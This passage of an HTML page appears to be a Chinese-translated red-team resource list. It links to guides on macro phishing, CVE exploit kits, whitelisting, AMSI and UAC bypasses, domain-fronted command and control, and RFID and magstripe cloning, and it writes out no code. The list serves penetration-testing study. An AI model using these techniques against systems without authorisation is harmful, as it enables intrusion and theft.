data-url=\"aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTYvMDUvZW1haWwtcmVjb25uYWlzc2FuY2UtcGhpc2hpbmctdGVtcGxhdGUtZ2VuZXJhdGlvbi1tYWRlLXNpbXBsZS8=\">电子邮件侦察与钓鱼邮件模版生成</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8wNS8xNC9hbi11bm5lY2Vzc2FyeS1hZGRpY3Rpb24tdG8tZG5zLWNvbW11bmljYXRpb24v\">不必依赖 DNS 通信</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9menVja2VybWFuLndvcmRwcmVzcy5jb20vMjAxNi8xMC8wNi9wb3dlcnNoZWxsLWVtcGlyZS1zdGFnZXJzLTEtcGhpc2hpbmctd2l0aC1hbi1vZmZpY2UtbWFjcm8tYW5kLWV2YWRpbmctYXZzLw==\">POWERSHELL EMPIRE 策略 1: 使用 Office 宏指令进行钓鱼与逃避杀软</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL3BoaXNoaW5nLXdpdGgtcG93ZXJwb2ludC8=\">使用 PowerPoint 进行钓鱼</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbmlnbWEweDMubmV0LzIwMTYvMDMvMTUvcGhpc2hpbmctd2l0aC1lbXBpcmUv\">使用 EMPIRE 进行钓鱼</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zaXhkdWIubmV0Lz9wPTYyNw==\">Empire 与工具多样性：整合是关键</span></li>\n</ul>\n<h2 id=\"-4\"><a class=\"anchor\" href=\"#-4\">#</a> <a href=\"#table-of-contents\">↑</a> 植入</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wNC9leHBsb2l0aW5nLWN2ZS0yMDE3LTAxOTktaHRhLWhhbmRsZXItdnVsbmVyYWJpbGl0eS8=\">CVE-2017-0199: HTA 处理漏洞</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JoZHJlc2gvQ1ZFLTIwMTctMDE5OQ==\">CVE-2017-0199 工具包</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z5c2VjL0NWRS0yMDE3LTg3NTktRXhwbG9pdC1zYW1wbGU=\">CVE-2017-8759 Exploit 示例</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z5c2VjL1dpbmRvd3MtU2lnbmVkQmluYXJ5\">签名 Window 二进制程序</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vdG9vbHMvd2Vwd25pc2Uv\">Wepwnise</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWtzaG9wLmNvbS9wcm9kdWN0cy9iYXNoLWJ1bm55\">Bash Bunny</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VuaWdtYTB4My9HZW5lcmF0ZS1NYWNybw==\">生成宏的工具</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL2VtcGlyZXMtY3Jvc3MtcGxhdGZvcm0tb2ZmaWNlLW1hY3JvLw==\">Empire 中的跨平台 Office 宏</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly80c3lzb3BzLmNvbS9hcmNoaXZlcy9leGNlbC1tYWNyb3Mtd2l0aC1wb3dlcnNoZWxsLw==\">使用 PowerShell 执行 Excel 宏</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9waGlzaG1lLmNvbS9wb3dlcnBvaW50LWFuZC1jdXN0b20tYWN0aW9ucy8=\">PowerPoint 与自定义行为</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NlY3JldHNxdWlycmVsL1NpZ1RoaWVm\">三步签名 mimikatz</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaXNjeWJ1c2luZXNzLndvcmRwcmVzcy5jb20vMjAxNy8xMC8wNy9oaWRpbmcteW91ci1wcm9jZXNzLWZyb20tc3lzaW50ZXJuYWxzLw==\">在 sysinternals 中隐藏你的进程</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2hlbGxudGVsLmNvbS9ibG9nLzIwMTYvOS8xMy9sdWNreXN0cmlrZS1hLWRhdGFiYXNlLWJhY2tlZC1ldmlsLW1hY3JvLWdlbmVyYXRvcg==\">Luckystrike: 邪恶 Office 文档生成器</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2dlb3JnZW1hdWVyLm5ldC8yMDE3LzEwLzA3L2Nzdi1pbmplY3Rpb24uaHRtbA==\">被低估的 CSV 注入风险</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNy9tYWNyby1sZXNzLWNvZGUtZXhlYy1pbi1tc3dvcmQv\">MSWord 中无宏代码执行</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BtYWxjb212ZXR0ZXIvbXVsdGktcGxhdGZvcm0tbWFjcm8tcGhpc2hpbmctcGF5bG9hZHMtM2I2ODhlOGVmZjY4\">跨平台宏钓鱼载荷</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mdXJvbmVyLndvcmRwcmVzcy5jb20vMjAxNy8xMC8xNy9tYWNyb2xlc3MtbWFsd2FyZS10aGF0LWF2b2lkcy1kZXRlY3Rpb24td2l0aC15YXJhLXJ1bGUvYW1wLw==\">Macroless DOC 恶意软件躲避 Yara 规则</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibmVnLmlvLzIwMTcvMDcvMjYvZW1waXJlLXdpdGhvdXQtcG93ZXJzaGVsbC1leGUv\">无 Powershell 的 Empire</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL3Bvd2Vyc2hlbGwtd2l0aG91dC1wb3dlcnNoZWxsLWhvdy10by1ieXBhc3MtYXBwbGljYXRpb24td2hpdGVsaXN0aW5nLWVudmlyb25tZW50LXJlc3RyaWN0aW9ucy1hdi8=\">无 Powershell 的 Powershell 来绕过应用程序白名单</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0B2aXZhbWkvcGhpc2hpbmctYmV0d2Vlbi10aGUtYXBwLXdoaXRlbGlzdHMtMWI3ZGNkYWI0Mjc5\">应用程序白名单的钓鱼</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3N1YnQweDEwLmJsb2dzcG90LnNnLzIwMTcvMDQvYnlwYXNzLWFwcGxpY2F0aW9uLXdoaXRlbGlzdGluZy1zY3JpcHQuaHRtbA==\">绕过应用程序白名单脚本保护 -  Regsvr32.exe 与 COM 脚本 (.sct 文件)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3N1YnQweDEwLmJsb2dzcG90LnNnLzIwMTcvMDQvYnlwYXNzaW5nLWFwcGxpY2F0aW9uLXdoaXRlbGlzdGluZy5odG1s\">使用 MSBuild.exe 绕过应用程序白名单 - Device Guard 示例与缓解措施</span></li>\n</ul>\n<h2 id=\"-5\"><a class=\"anchor\" href=\"#-5\">#</a> <a href=\"#table-of-contents\">↑</a> 横向移动</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNi8xMi9jbmEtZXZlbnR2d3ItdWFjLWJ5cGFzcy8=\">Eventvwr File-less UAC Bypass CNA</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbmlnbWEweDMubmV0LzIwMTcvMDkvMTEvbGF0ZXJhbC1tb3ZlbWVudC11c2luZy1leGNlbC1hcHBsaWNhdGlvbi1hbmQtZGNvbS8=\">使用 Excel 与 dcom 进行横向移动</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL3dzaC1pbmplY3Rpb24tYS1jYXNlLXN0dWR5LWZkMzVmNzlkMjlkZA==\">WSH 注射案例研究</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2ZpbGVsZXNzLXVhYy1ieXBhc3MtdXNpbmctc2RjbHQtZXhlLTNlOWY5YWQ0ZTJiMw==\">Fileless UAC Bypass using sdclt</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2J5cGFzc2luZy1hbXNpLXZpYS1jb20tc2VydmVyLWhpamFja2luZy1iOGEzMzU0ZDFhZmY=\">劫持 COM 服务器绕过 AMSI</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3R5cmFuaWQvRGV2aWNlR3VhcmRCeXBhc3Nlcw==\">绕过 Window 10 的 Device Guard</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNi8xMi8xNC9teS1maXJzdC1nby13aXRoLWJsb29kaG91bmQv\">My First Go with BloodHound</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNy8wNi8yMy9vcHNlYy1jb25zaWRlcmF0aW9ucy1mb3ItYmVhY29uLWNvbW1hbmRzLw==\">OPSEC 有关 beacon command 的注意事项</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNi8xMS8wMy9hZ2VudGxlc3MtcG9zdC1leHBsb2l0YXRpb24v\">无代理载荷投递</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8xMi8xNi93aW5kb3dzLWFjY2Vzcy10b2tlbnMtYW5kLWFsdGVybmF0ZS1jcmVkZW50aWFscy8=\">Windows 访问令牌与备用凭据</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pcm9uZ2Vlay5jb20vaS5waHA/cGFnZT12aWRlb3MvZGVyYnljb243L3QxMDQtcHNhbXNpLWFuLW9mZmVuc2l2ZS1wb3dlcnNoZWxsLW1vZHVsZS1mb3ItaW50ZXJhY3Rpbmctd2l0aC10aGUtYW50aS1tYWx3YXJlLXNjYW4taW50ZXJmYWNlLWluLXdpbmRvd3MtMTAtcnlhbi1jb2Ji\">PSAmsi - Windows 10 中与反恶意软件扫描接口交互的进攻性 PowerShell 模块</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3RocmVhdC50ZXZvcmEuY29tL2xheS1vZi10aGUtbGFuZC13aXRoLWJsb29kaG91bmQv\">Lay of the Land with BloodHound</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNi9icmluZ2luZy10aGUtaGFzaGVzLWhvbWUtd2l0aC1yZWdlb3JnLWVtcGlyZS8=\">使用 reGeorg 与 Empire 得到哈希</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNi9pbnRlcmNlcHRpbmctcGFzc3dvcmRzLXdpdGgtZW1waXJlLWFuZC13aW5uaW5nLw==\">使用 Empire 截取密码</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNy9vdXRsb29rLWhvbWUtcGFnZS1hbm90aGVyLXJ1bGVyLXZlY3Rvci8=\">Outlook 主页 – 另一个攻击向量</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNy9vdXRsb29rLWZvcm1zLWFuZC1zaGVsbHMv\">Outlook 的 Form 与 Shell</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25ldGJpb3NYL0NoZWNrbGlzdHMvYmxvYi9tYXN0ZXIvV2luZG93cy1Qcml2aWxlZ2UtRXNjYWxhdGlvbi5tZA==\">Windows 提权清单</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaWxlbnRicmVha3NlY3VyaXR5LmNvbS90aHJvd2JhY2stdGh1cnNkYXktYS1ndWlkZS10by1jb25maWd1cmluZy10aHJvd2JhY2sv\">配置回滚指南</span></li>\n</ul>\n<h2 id=\"-6\"><a class=\"anchor\" href=\"#-6\">#</a> <a href=\"#table-of-contents\">↑</a> 命令控制</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL2J1aWxkLWMyLWluZnJhc3RydWN0dXJlLWRpZ2l0YWwtb2NlYW4tcGFydC0xLw==\">使用 Digital Ocean 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNC8wOS8wOS9pbmZyYXN0cnVjdHVyZS1mb3Itb25nb2luZy1yZWQtdGVhbS1vcGVyYXRpb25zLw==\">红队行动的基础设施</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXN0YW1vdXNlLm1lLzIwMTcvMDgvYXV0b21hdGVkLXJlZC10ZWFtLWluZnJhc3RydWN0dXJlLWRlcGxveW1lbnQtd2l0aC10ZXJyYWZvcm0tLS1wYXJ0LTEv\">使用 Terraform 进行红队基础设施自动化部署</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTYvMTEvdG9wLXJlZC10ZWFtLXRpcHMv\">6 个红队基础设施的小提示</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE3LTA1LTAyLXJlZC10ZWFtaW5nLWZvci1wYWNpZmljLXJpbS1jY2RjLTIwMTcv\">Pacific Rim CCDC 2017 中的红队</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE1LTA0LTE1LWhvdy1pLXByZXBhcmVkLXRvLXJlZC10ZWFtLWF0LXByY2NkYy0yMDE1Lw==\">在 PRCCDC 2015 中我是如何进行红队准备的？</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE2LTA1LTI0LXBhY2lmaWMtcmltLWNjZGNfMjAxNi8=\">Pacific Rim CCDC 2016 中的红队</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE3LTA4LTMwLXJhbmRvbWl6ZWQtbWFsbGVhYmxlLWMyLXByb2ZpbGVzLW1hZGUtZWFzeS8=\">随机化 Malleable 的 C2 配置</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE2LTA2LTI4LWNvYmFsdC1zdHJpa2UtaHR0cC1jMi1yZWRpcmVjdG9ycy13aXRoLWFwYWNoZS1tb2RfcmV3cml0ZS8=\">使用 Apache 和 mod_rewrite 重定向 Cobalt Strike 的 HTTP C2 - Jeff Dimmock</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNy8wMi8wNi9oaWdoLXJlcHV0YXRpb24tcmVkaXJlY3RvcnMtYW5kLWRvbWFpbi1mcm9udGluZy8=\">高信誉的重定向与域名前置</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wMi90b3ItZnJvbnRpbmctdXRpbGlzaW5nLWhpZGRlbi1zZXJ2aWNlcy1mb3ItcHJpdmFjeS8=\">TOR Fronting – 利用隐藏服务保护隐私</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wMi9kb21haW4tZnJvbnRpbmctdmlhLWNsb3VkZnJvbnQtYWx0ZXJuYXRlLWRvbWFpbnMv\">通过 Cloudfront Alternate Domains 部署域名前置</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmVkdGVhbXNlY3VyZS5jb20vdGhlLXBsdWdib3QtaGFyZHdhcmUtYm90bmV0LXJlc2VhcmNoLXByb2plY3Qv\">PlugBot: 硬件僵尸网络研究项目</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2F0dGFjay1pbmZyYXN0cnVjdHVyZS1sb2ctYWdncmVnYXRpb24tYW5kLW1vbml0b3JpbmctMzQ1ZTQxNzMwNDRl\">攻击基础设施日志聚合与监视</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3J2cnNoM2xsL0ZpbmRGcm9udGFibGVEb21haW5z\">发现前置域名</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL24wcGUtc2xlZC9BcGFjaGUyLU1vZC1SZXdyaXRlLVNldHVw\">安装 Apache2Mod Rewrite</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueG9ycmlvci5jb20vRW1waXJlLURvbWFpbi1Gcm9udGluZy8=\">Empre 域名前置</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pbmlzbGxjL2RvbWFpbmh1bnRlcg==\">域名猎手</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8xMC8yMS9taWdyYXRpbmcteW91ci1pbmZyYXN0cnVjdHVyZS8=\">迁移您的基础设施</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ydnJzaDNsbC5uZXQvYmxvZy9vZmZlbnNpdmUvcmVkaXJlY3RpbmctY29iYWx0LXN0cmlrZS1kbnMtYmVhY29ucy8=\">重定向 Cobalt Strike 的 DNS Beacon</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90aGVvYnNpZGlhbnRvd2VyLmNvbS8yMDE3LzA3LzI0L2QwYTdjZmNlZWRjNDJiZGYzYTM2ZjI5MjZiZDUyODYzZWYyOGJlZmMuaHRtbA==\">发现 Azure 中的前置域名 - thoth / Fionnbharr (@a_profligate)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3liZXJhcmsuY29tL3RocmVhdC1yZXNlYXJjaC1ibG9nL3JlZC10ZWFtLWluc2lnaHRzLWh0dHBzLWRvbWFpbi1mcm9udGluZy1nb29nbGUtaG9zdHMtdXNpbmctY29iYWx0LXN0cmlrZS8=\">对 Google Host 中的 HTTPS 域名前置的红队洞察</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3B0aXYuY29tL2Jsb2cvZXNjYXBlLWFuZC1ldmFzaW9uLWVncmVzc2luZy1yZXN0cmljdGVkLW5ldHdvcmtz\">逃出出口受限网络 - Tom Steele and Chris Patten</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL3Bvd2Vyc2hlbGwvY29tbWFuZC1hbmQtY29udHJvbC11c2luZy1hY3RpdmUtZGlyZWN0b3J5Lw==\">使用 Active Directory 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOS8yNi9jb21tYW5kLWFuZC1jb250cm9sLXR3aXR0ZXIv\">使用 Twitter 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOS8wNi9jb21tYW5kLWFuZC1jb250cm9sLWRucy8=\">使用 DNS 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wNy8yOC9jb21tYW5kLWFuZC1jb250cm9sLWljbXAv\">使用 ICMP 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOC8yOS9jb21tYW5kLWFuZC1jb250cm9sLWRyb3Bib3gv\">使用 Dropbox 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8xMC8wNC9jb21tYW5kLWFuZC1jb250cm9sLWh0dHBzLw==\">使用 HTTPS 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOS8xMi9jb21tYW5kLWFuZC1jb250cm9sLXdlYmRhdi8=\">使用 webdav 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOC8wMy9jb21tYW5kLWFuZC1jb250cm9sLWdtYWlsLw==\">使用 Gmail 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vYmxvZy90YXNraW5nLW9mZmljZS0zNjUtZm9yLWNvYmFsdC1zdHJpa2UtYzIv\">使用 Office 365 的任务用于 Cobalt Strike 的 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJpdHlhcnR3b3JrLmVzLzIwMTcvMDEvMzEvc2ltcGxlLWRvbWFpbi1mcm9udGluZy1wb2Mtd2l0aC1nYWUtYzItc2VydmVyLw==\">GAE C2 服务器简单域名前置 PoC</span></li>\n</ul>\n<h2 id=\"-7\"><a class=\"anchor\" href=\"#-7\">#</a> <a href=\"#table-of-contents\">↑</a> 嵌入式与物理设备</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJ1c3R3YXZlLmNvbS9SZXNvdXJjZXMvU3BpZGVyTGFicy1CbG9nL0dldHRpbmctaW4td2l0aC10aGUtUHJveG1hcmstMy1hbmQtUHJveEJydXRlLw==\">从 Proxmark3 与 ProxBrute 开始</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm52aXNvLmJlLzIwMTcvMDEvMTEvYS1wcmFjdGljYWwtZ3VpZGUtdG8tcmZpZC1iYWRnZS1jb3B5aW5nLw==\">RFID Badge 复制实用指南</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHVubmVsc3VwLmNvbS9jb250ZW50cy1vZi1hLXBoeXNpY2FsLXBlbi10ZXN0ZXJzLWJhY2twYWNrLw==\">一个物理渗透测试人员的背包</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NhbXlrL21hZ3Nwb29m\">MagSpoof - 信用卡 / 磁条卡伪造</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zYW15LnBsL2tleXN3ZWVwZXIv\">无线键盘嗅探器</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmtjaHVuZy5jby9yZmlkLWhhY2tpbmctd2l0aC10aGUtcHJveG1hcmstMy8=\">使用 Proxmark 3 进行 RFID 入侵</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3MuYmhhbS5hYy51ay9+Z2FyY2lhZi9wdWJsaWNhdGlvbnMvVHV0b3JpYWxfUHJveG1hcmtfdGhlX1N3aXNzX0FybXlfS25pZmVfZm9yX1JGSURfU2VjdXJpdHlfUmVzZWFyY2gtUkZJRFNlYzEyLnBkZg==\">RFID 的瑞士军刀</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpYS5ibGFja2hhdC5jb20vYmgtdXMtMTIvQnJpZWZpbmdzL0NfTWlsbGVyL0JIX1VTXzEyX01pbGxlcl9ORkNfYXR0YWNrX3N1cmZhY2VfV1AucGRm\">探索 NFC 的攻击面</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2dlcmhhcmQuZGVrb25pbmdnYW5zLm5sL2RvY3VtZW50cy9wdWJsaWNhdGlvbnMvZGVrb25pbmdnYW5zLnBoZC50aGVzaXMucGRm\">智能卡</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmtjaHVuZy5jby9yZXZlcnNlLWVuZ2luZWVyaW5nLWhpZC1pY2xhc3MtbWFzdGVyLWtleXMv\">逆向 HID iClass 的主密钥</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucHduaWVleHByZXNzLmNvbS9hb3Bw\">Android Open Pwn Project (AOPP)</span></li>\n</ul>\n<h2 id=\"-8\"><a class=\"anchor\" href=\"#-8\">#</a> <a href=\"#table-of-contents\">↑</a> 杂项</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z5c2VjL1JlZFRpcHM=\">Vysec 的红队技巧</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNi8wMi8yMy9jb2JhbHQtc3RyaWtlLXRpcHMtZm9yLTIwMTYtY2NkYy1yZWQtdGVhbXMv\">Cobalt Strike 红队技巧 - 2016</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8wNy8wOS9tb2RlbHMtZm9yLXJlZC10ZWFtLW9wZXJhdGlvbnMv\">红队行动模型</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hZ29vL3JlZHRlYW0tcGxhbg==\">红队实践计划</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1vY2xiYnF2YXdRZw==\">Raphael Mudge - 肮脏的红队技巧</span></li>\n</ul>\n<h2 id=\"-9\"><a class=\"anchor\" href=\"#-9\">#</a> <a href=\"#table-of-contents\">↑</a> 电子书籍</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9OZXh0LUdlbmVyYXRpb24tVGVhbWluZy1IZW5yeS1EYWx6aWVsL2RwLzAxMjgwNDE3MTQ=\">下一代红队行动</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9UYXJnZXRlZC1DeWJlci1BdHRhY2tzLU11bHRpLXN0YWdlZC1FeHBsb2l0cy9kcC8wMTI4MDA2MDQ4\">针对性网络攻击</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9BZHZhbmNlZC1QZW5ldHJhdGlvbi1UZXN0aW5nLUhhY2tpbmctTmV0d29ya3MvZHAvMTExOTM2NzY4OQ==\">高级渗透测试：入侵全球最安全的网络</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9Tb2NpYWwtRW5naW5lZXJzLVBsYXlib29rLVByYWN0aWNhbC1QcmV0ZXh0aW5nL2RwLzA2OTIzMDY2MTcvcmVmPWFzX2xpX3NzX3RsP2llPVVURjgmYW1wO2xpbmtDb2RlPXNsMSZhbXA7dGFnPXRhbGFtYW50ZXN1cy0yMCZhbXA7bGlua0lkPTM3YjYzYzc3MDJjOWJlNmI5ZjZhMWI5MjFjODhjOGNk\">社会工程的手边书</span></li>\n</ul>\n<h2 id=\"-10\"><a class=\"anchor\" href=\"#-10\">#</a> <a href=\"#table-of-contents\">↑</a> 培训（免费）</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1JUnBTN29aM3owbyZhbXA7bGlzdD1QTDlITzZNX01VMm5lc3hTbWhKakV2d0xoVW9IUEhtWHZ6\">Tradecraft - 关于红队行动的课程</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8wOS8zMC9hZHZhbmNlZC10aHJlYXQtdGFjdGljcy1jb3Vyc2UtYW5kLW5vdGVzLw==\">高级威胁战术课程与笔记</span></li>\n</ul>\n<h2 id=\"-11\"><a class=\"anchor\" href=\"#-11\">#</a> <a href=\"#table-of-contents\">↑</a> 认证</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jcmVzdC1hcHByb3ZlZC5vcmcvZXhhbWluYXRpb24vY2VydGlmaWVkLXNpbXVsYXRlZC1hdHRhY2stc3BlY2lhbGlzdC8=\">CREST 模拟攻击专家</span></li>\n<li><span class=\"exturl\" 